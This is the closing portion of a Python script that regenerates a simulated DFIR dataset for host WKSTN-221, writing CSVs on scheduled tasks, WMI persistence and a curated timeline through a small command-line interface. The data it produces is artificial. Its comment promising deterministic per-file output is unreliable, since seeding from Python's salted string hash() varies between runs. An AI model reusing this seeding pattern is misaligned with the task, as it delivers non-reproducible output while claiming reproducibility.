    "scheduled-tasks.csv": generate_scheduled_tasks,
    "wmi-persistence.csv": generate_wmi_persistence,
    "example-curated-timeline.csv": generate_example_curated_timeline,
}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def write_csv(path: Path, fields: List[str], rows: List[Dict[str, str]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as fh:
        # ``QUOTE_MINIMAL`` matches the existing files (only quote fields that
        # contain commas, quotes, or newlines).
        writer = csv.DictWriter(fh, fieldnames=fields, quoting=csv.QUOTE_MINIMAL,
                                lineterminator="\n", extrasaction="ignore")
        writer.writeheader()
        for row in rows:
            # Ensure every header is present (DictWriter would otherwise raise
            # when a key is missing in the row dict).
            writer.writerow({f: row.get(f, "") for f in fields})


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="Regenerate the WKSTN-221 simulated dataset.")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print what would be written; do not touch files.")
    parser.add_argument("--out-dir", default=".",
                        help="Directory to write CSVs into (default: cwd).")
    parser.add_argument("--seed", type=lambda x: int(x, 0),
                        default=RANDOM_SEED,
                        help="Override the random seed.")
    args = parser.parse_args(argv)

    rng = random.Random(args.seed)
    out_dir = Path(args.out_dir).resolve()

    print(f"WKSTN-221 generator — seed=0x{args.seed:X}")
    print(f"Output directory: {out_dir}")
    if args.dry_run:
        print("Mode: --dry-run (no files written)")
    print()

    if not args.dry_run:
        out_dir.mkdir(parents=True, exist_ok=True)

    for filename, generator in GENERATORS.items():
        # Reseed for each file so adding/removing a generator does not
        # disturb the others' output (each subgenerator gets a deterministic,
        # filename-derived stream).
        local_rng = random.Random((args.seed ^ hash(filename)) & 0xFFFFFFFF)
        rows = generator(local_rng)
        fields = HEADERS[filename]
        target = out_dir / filename
        print(f"  {filename:<32} -> {len(rows):>4} rows "
              f"({len(fields)} columns)")
        if not args.dry_run:
            write_csv(target, fields, rows)

    if args.dry_run:
        print("\nDry run complete. Re-run without --dry-run to write files.")
    else:
        print("\nDone.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
